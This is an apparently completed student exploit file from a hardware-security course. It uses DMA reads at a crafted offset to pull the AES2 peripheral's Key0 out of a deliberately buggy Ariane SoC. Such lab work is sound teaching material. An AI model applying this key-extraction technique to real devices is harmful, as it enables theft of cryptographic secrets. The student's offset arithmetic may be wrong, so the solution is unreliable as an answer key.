/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - This is the template program file for exploit E2.
//  - Check the Appendix B of assignment manual for more details about the bug and
//    how the exploit is constructed.
//
//  - Command to run this file: source make_run_user_with_pk.sh exploit2
//
//  - Submit the updated version of this file along with your pdf report.
//  - This report should be executable on the buggy SoC provided to you.
//  - Add comments where ever needed. Your program file will not be evaluated
//    without the comments.
//  - Search for the word 'EDIT' to find all the places where you need to edit
//    this file to complete the exploit
//
/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - The flag for exploit 2 is the Key0 of the AES2 crypto peripheral
//
/////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

#include "ariane_api.h"  // includes all the API functions to access the peripherals



//////////////////////////////////
//
// Main function that runs the exploit
//
//////////////////////////////////
void main(void)
{
	printf("Running exploit 2\n");

    //////////////////////////////////
    // Generate student ID
    // - Generates a unique ID per student per exploit
    //////////////////////////////////

    char student_name[] = "Daniel Horan" ; // EDIT: replace the string with your first and last names

    print_student_id(student_name, 2);


    //////////////////////////////////
    //  Run the exploit
    //  - The exploit successfully recovers the Key0 of the AES2 crypt peripheral
    //////////////////////////////////

    uint64_t rdata[4]; // DMA reads 32 bits at a time but returns them
                       // as 64 bit by extending 32 bit data with 0's
                       // thats why array is 64 bit integers

    // first we try to read the data from the base address of the AES2 peripheral to demonstrate that
    // we cannot get the Key0 directly by reading from the base address.
    // see the using_DMA.c program for details about DMA transfer function
    dma_transfer_from_perif(AES2_BASE, rdata, 0x4, 1);

    // print the values read
    // this should print all 0's since we cannot get the key directly
    printf("Data read directly = %08x %08x %08x %08x \n", rdata[0], rdata[1], rdata[2], rdata[3]);

    // for the attack to work, we should be reading from base address of AES2 + an offset. The offset should be
    // such that:
    // (i) it is a multiple of 4 so that we can get all the 4 key0 words
    // (ii) it will result in the default case statement, ie., the offset cannot be 0,1,2,3,4,9,10,11,12,13
    //               (these numbers come from the openpiton/piton/design/chip/tile/ariane/src/aes2/aes2_wrapper.sv file lines 157 to 175)
    // (iii) offset+1 offset+2, and offset+3 should also not be one of the above numbers
    //       for example: 8 is a multiple of 4 and is not in the numbers used for case statement, but 8+1 is in case statement,
    //                    so, we cannot use 8.
    // EDIT: Write the DMA transfer function (like the one in line 59) but with the correct source address

		//offset set to 20, chosen for being larger than the highest case value and a multiple of 4
	  //this ensures alignment with the 32-bit word boundaries and avoids case statement addresses
		uint64_t offset = 20;
		//source address calculation combines AES2 base address with the offset, targeting the memory location with Key0
	  //this address points to where Key0 data can be read, exploiting the AES2 peripheral's vulnerability
    uint64_t source_address = AES2_BASE + offset * sizeof(uint64_t);
		//texecute DMA read from the calculated source address to rdata, retrieving 4 words (0x4) of data
		//the '1' indicates a standard read operation, expecting to read Key0 data into rdata
    dma_transfer_from_perif(source_address, rdata, 0x4, 1);


    // EDIT: print the values read like we did in line 63. this will be our flag.
		//print the retrieved Key0, which should be the cryptographic key extracted from the AES2 peripheral.
    printf("Key0 = %08x %08x %08x %08x \n", rdata[0], rdata[1], rdata[2], rdata[3]);


    return;
}
